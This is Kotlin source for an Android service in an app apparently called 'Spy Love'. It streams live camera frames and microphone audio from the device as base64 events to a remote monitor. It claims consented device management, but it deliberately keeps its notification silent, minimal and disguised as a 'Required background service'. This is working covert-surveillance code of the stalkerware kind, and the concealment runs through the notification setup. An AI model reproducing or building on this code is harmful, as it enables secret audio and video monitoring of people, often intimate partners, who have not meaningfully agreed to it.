package org.hmg.spy_love

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream

/**
 * Live camera + microphone capture for consented MDM monitoring.
 *
 * Frames/audio are pushed to [LiveAvEventSink] as maps:
 *  - camera: `{type: "camera.frame", image: b64 jpeg, w, h, facing}`
 *  - mic:    `{type: "mic.pcm", pcm: b64 s16le, sampleRate, channels}`
 *
 * A minimal foreground notification is required by Android for camera/mic FGS
 * types; the OS green privacy indicator cannot be suppressed.
 */
object LiveAvEventSink {
    @Volatile
    var sink: EventChannel.EventSink? = null
}

object LiveAvController {
    private const val TAG = "SpyLoveLiveAv"
    const val EXTRA_MODE = "mode" // camera | mic | both
    const val EXTRA_FACING = "facing" // front | back

    @Volatile
    var desiredFacing: String = "back"

    fun startCamera(context: Context, facing: String, result: MethodChannel.Result) {
        if (!hasPermission(context, Manifest.permission.CAMERA)) {
            result.success(false)
            return
        }
        desiredFacing = if (facing == "front") "front" else "back"
        val intent = Intent(context, LiveAvService::class.java).apply {
            putExtra(EXTRA_MODE, "camera")
            putExtra(EXTRA_FACING, desiredFacing)
        }
        try {
            ContextCompat.startForegroundService(context, intent)
            result.success(true)
        } catch (t: Throwable) {
            Log.e(TAG, "startCamera failed", t)
            result.success(false)
        }
    }

    fun switchCamera(facing: String, result: MethodChannel.Result) {
        desiredFacing = if (facing == "front") "front" else "back"
        LiveAvService.instance?.switchCamera(desiredFacing)
        result.success(true)
    }

    fun stopCamera(context: Context) {
        LiveAvService.instance?.stopCameraOnly()
        if (LiveAvService.instance?.isMicRunning != true) {
            context.stopService(Intent(context, LiveAvService::class.java))
        }
    }

    fun startMic(context: Context, result: MethodChannel.Result) {
        if (!hasPermission(context, Manifest.permission.RECORD_AUDIO)) {
            result.success(false)
            return
        }
        val intent = Intent(context, LiveAvService::class.java).apply {
            putExtra(EXTRA_MODE, "mic")
        }
        try {
            ContextCompat.startForegroundService(context, intent)
            result.success(true)
        } catch (t: Throwable) {
            Log.e(TAG, "startMic failed", t)
            result.success(false)
        }
    }

    fun stopMic(context: Context) {
        LiveAvService.instance?.stopMicOnly()
        if (LiveAvService.instance?.isCameraRunning != true) {
            context.stopService(Intent(context, LiveAvService::class.java))
        }
    }

    private fun hasPermission(context: Context, permission: String): Boolean =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
}

class LiveAvService : Service() {
    companion object {
        private const val TAG = "SpyLoveLiveAv"
        private const val NOTIFICATION_ID = 0xA711
        @Volatile
        var instance: LiveAvService? = null
    }

    @Volatile
    var isCameraRunning: Boolean = false
        private set
    @Volatile
    var isMicRunning: Boolean = false
        private set

    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var currentFacing: String = "back"
    private var lastFrameAt = 0L

    private var micThread: Thread? = null
    @Volatile
    private var micStop = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val mode = intent?.getStringExtra(LiveAvController.EXTRA_MODE) ?: "camera"
        val facing = intent?.getStringExtra(LiveAvController.EXTRA_FACING)
            ?: LiveAvController.desiredFacing
        try {
            startForegroundWithNotification(mode)
        } catch (t: Throwable) {
            Log.e(TAG, "startForeground failed", t)
            stopSelf()
            return START_NOT_STICKY
        }
        when (mode) {
            "camera" -> startCameraInternal(facing)
            "mic" -> startMicInternal()
            "both" -> {
                startCameraInternal(facing)
                startMicInternal()
            }
        }
        return START_STICKY
    }

    fun switchCamera(facing: String) {
        if (!isCameraRunning) return
        stopCameraInternal()
        startCameraInternal(facing)
    }

    fun stopCameraOnly() {
        stopCameraInternal()
        maybeStopService()
    }

    fun stopMicOnly() {
        stopMicInternal()
        maybeStopService()
    }

    private fun maybeStopService() {
        if (!isCameraRunning && !isMicRunning) stopSelf()
        else {
            try {
                startForegroundWithNotification(
                    when {
                        isCameraRunning && isMicRunning -> "both"
                        isMicRunning -> "mic"
                        else -> "camera"
                    },
                )
            } catch (_: Throwable) {
            }
        }
    }

    private fun startCameraInternal(facing: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        currentFacing = facing
        cameraThread = HandlerThread("live-av-camera").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)

        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = findCameraId(manager, facing) ?: findCameraId(manager, "back") ?: return
        val characteristics = manager.getCameraCharacteristics(cameraId)
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?: return
        val size = pickSize(map.getOutputSizes(ImageFormat.YUV_420_888))
        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.YUV_420_888, 2)
        imageReader = reader
        reader.setOnImageAvailableListener({ r ->
            val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val now = System.currentTimeMillis()
                if (now - lastFrameAt < 120) return@setOnImageAvailableListener
                lastFrameAt = now
                val jpeg = yuv420ToJpeg(image, quality = 45) ?: return@setOnImageAvailableListener
                val b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
                Handler(Looper.getMainLooper()).post {
                    LiveAvEventSink.sink?.success(
                        hashMapOf(
                            "type" to "camera.frame",
                            "image" to b64,
                            "w" to image.width,
                            "h" to image.height,
                            "facing" to currentFacing,
                        ),
                    )
                }
            } catch (_: Throwable) {
            } finally {
                image.close()
            }
        }, cameraHandler)

        manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                try {
                    camera.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                req.addTarget(reader.surface)
                                req.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                                session.setRepeatingRequest(req.build(), null, cameraHandler)
                                isCameraRunning = true
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "camera configure failed")
                            }
                        },
                        cameraHandler,
                    )
                } catch (t: Throwable) {
                    Log.e(TAG, "createCaptureSession failed", t)
                }
            }

            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
            }

            override fun onError(camera: CameraDevice, error: Int) {
                camera.close()
            }
        }, cameraHandler)
    }

    private fun stopCameraInternal() {
        isCameraRunning = false
        try {
            captureSession?.close()
            cameraDevice?.close()
            imageReader?.close()
        } catch (_: Throwable) {
        }
        captureSession = null
        cameraDevice = null
        imageReader = null
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
    }

    private fun startMicInternal() {
        if (isMicRunning) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        micStop = false
        micThread = Thread({
            val sampleRate = 16000
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            val minBuf = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val bufferSize = (minBuf * 2).coerceAtLeast(3200)
            val recorder = try {
                AudioRecord(
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize,
                )
            } catch (t: Throwable) {
                Log.e(TAG, "AudioRecord create failed", t)
                return@Thread
            }
            if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                recorder.release()
                return@Thread
            }
            isMicRunning = true
            val buf = ByteArray(bufferSize)
            try {
                recorder.startRecording()
                while (!micStop) {
                    val n = recorder.read(buf, 0, buf.size)
                    if (n > 0) {
                        val chunk = buf.copyOf(n)
                        val b64 = Base64.encodeToString(chunk, Base64.NO_WRAP)
                        Handler(Looper.getMainLooper()).post {
                            LiveAvEventSink.sink?.success(
                                hashMapOf(
                                    "type" to "mic.pcm",
                                    "pcm" to b64,
                                    "sampleRate" to sampleRate,
                                    "channels" to 1,
                                ),
                            )
                        }
                    }
                }
            } catch (t: Throwable) {
                Log.e(TAG, "mic loop failed", t)
            } finally {
                try {
                    recorder.stop()
                } catch (_: Throwable) {
                }
                recorder.release()
                isMicRunning = false
            }
        }, "live-av-mic").also { it.start() }
    }

    private fun stopMicInternal() {
        micStop = true
        try {
            micThread?.join(1000)
        } catch (_: Throwable) {
        }
        micThread = null
        isMicRunning = false
    }

    private fun startForegroundWithNotification(mode: String) {
        val channelId = "spy_love_device_mgmt"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                channelId,
                "Device management",
                NotificationManager.IMPORTANCE_MIN,
            )
            channel.setShowBadge(false)
            channel.description = "Required background service"
            nm.createNotificationChannel(channel)
        }
        // Minimal, non-alerting text — enrollment consent already disclosed AV.
        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Spy Love")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        val type = foregroundTypeFor(mode)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
            startForeground(NOTIFICATION_ID, notification, type)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun foregroundTypeFor(mode: String): Int {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return 0
        var type = 0
        val wantCamera = mode == "camera" || mode == "both" || isCameraRunning
        val wantMic = mode == "mic" || mode == "both" || isMicRunning
        if (wantCamera && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (wantMic && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        // Pre-14: camera/mic FGS types aren't required the same way; use none/specialUse-safe.
        if (type == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Keep a typed FGS on 10–13 by using "connectedDevice" is wrong; just untyped.
            return 0
        }
        return type
    }

    private fun findCameraId(manager: CameraManager, facing: String): String? {
        val want = if (facing == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }
        for (id in manager.cameraIdList) {
            val facingVal = manager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING)
            if (facingVal == want) return id
        }
        return null
    }

    private fun pickSize(sizes: Array<Size>?): Size {
        if (sizes == null || sizes.isEmpty()) return Size(640, 480)
        // Prefer ~720p or smaller for bandwidth.
        val sorted = sizes.sortedBy { it.width * it.height }
        return sorted.firstOrNull { it.width >= 640 && it.width <= 1280 }
            ?: sorted[sorted.size / 2]
    }

    private fun yuv420ToJpeg(image: android.media.Image, quality: Int): ByteArray? {
        val yBuffer = image.planes[0].buffer
        val uBuffer = image.planes[1].buffer
        val vBuffer = image.planes[2].buffer
        val ySize = yBuffer.remaining()
        val uSize = uBuffer.remaining()
        val vSize = vBuffer.remaining()
        val nv21 = ByteArray(ySize + uSize + vSize)
        yBuffer.get(nv21, 0, ySize)
        // NV21 expects V then U interleaved for the chroma plane; for many
        // devices plane[2]=V and plane[1]=U with pixelStride 2 — copy V then U.
        vBuffer.get(nv21, ySize, vSize)
        uBuffer.get(nv21, ySize + vSize, uSize)
        val yuv = YuvImage(nv21, ImageFormat.NV21, image.width, image.height, null)
        val out = ByteArrayOutputStream()
        if (!yuv.compressToJpeg(Rect(0, 0, image.width, image.height), quality, out)) {
            return null
        }
        return out.toByteArray()
    }

    override fun onDestroy() {
        stopCameraInternal()
        stopMicInternal()
        instance = null
        super.onDestroy()
    }
}

/** Monitor-side PCM playback for live mic chunks. */
object PcmPlayback {
    private var track: AudioTrack? = null

    @Synchronized
    fun play(pcm: ByteArray, sampleRate: Int, channels: Int) {
        val channelConfig = if (channels >= 2) {
            AudioFormat.CHANNEL_OUT_STEREO
        } else {
            AudioFormat.CHANNEL_OUT_MONO
        }
        var t = track
        if (t == null || t.sampleRate != sampleRate) {
            t?.release()
            val minBuf = AudioTrack.getMinBufferSize(
                sampleRate,
                channelConfig,
                AudioFormat.ENCODING_PCM_16BIT,
            )
            t = AudioTrack.Builder()
                .setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                        .build(),
                )
                .setAudioFormat(
                    AudioFormat.Builder()
                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                        .setSampleRate(sampleRate)
                        .setChannelMask(channelConfig)
                        .build(),
                )
                .setBufferSizeInBytes(minBuf.coerceAtLeast(pcm.size * 4))
                .setTransferMode(AudioTrack.MODE_STREAM)
                .build()
            t.play()
            track = t
        }
        try {
            t!!.write(pcm, 0, pcm.size)
        } catch (_: Throwable) {
        }
    }

    @Synchronized
    fun stop() {
        try {
            track?.stop()
            track?.release()
        } catch (_: Throwable) {
        }
        track = null
    }
}
